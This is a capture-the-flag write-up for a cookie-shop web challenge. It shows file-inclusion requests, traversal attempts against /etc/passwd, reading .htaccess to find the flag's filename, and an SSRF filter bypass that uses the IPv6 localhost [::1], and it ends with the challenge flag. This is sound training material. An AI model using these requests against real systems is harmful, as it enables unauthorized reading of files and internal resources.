Write-up:

1. Attempting to login as `admin:admin` and analyzing the response shows us we 
should try `guest:guest`, and we are able to log in.

2. Intercepting the GET request to a cookie's page: <br>
`GET /honey_milk_cookie.php?file=images/honey_milk_cookie.jpg`

    Attempting to change the file to `flag.txt` gets us the following response:

    `HINT{The_flag_is_placed_somewhere_else_but_I_dont_allow_others_to_read_it}`

3. Attempting `GET /honey_milk_cookie.php?file=/etc/passwd` gets us "Blocked! Access denied".

4. Attempting `GET /honey_milk_cookie.php?file=../flag.txt` also gets us "Blocked! Access denied".

5. Using `GET /honey_milk_cookie.php?file=index.php` to read the source code of index.php reveals the application logic.

6. `file=.htaccess` shows us there is a file called
`flag_123e4567-e89b-12d3-a456-426614174000.txt`, but the application logic doesn't
allows to access files if they start with `flag_`.

1. To bypass the `flag_` filename restriction, we exploit a Server-Side Request Forgery (SSRF) vulnerability. The application blocks common IPv4 private address ranges (10.x.x.x, 127.x.x.x, 192.168.x.x, etc.) but doesn't filter IPv6 addresses.

    Using IPv6 localhost notation `[::1]` bypasses the private IP filters:

    `GET /honey_milk_cookie.php?file=http://[::1]/flag_123e4567-e89b-12d3-a456-426614174000.txt HTTP/1.1`

    This leverages the fact that:
    - The application allows HTTP requests to external hosts
    - IPv6 localhost `[::1]` resolves to the local machine
    - The private IP regex patterns only check IPv4 format
    - The SSRF request bypasses the local file `basename()` check since it's treated as an external HTTP request

    This reveals the flag: `CRHC{r34d_.h7acc3ss_t0_kn0w_f14g_n4m3_th3n_sSrf_7o_&e7_th3_f14g_h41ae41h5y}`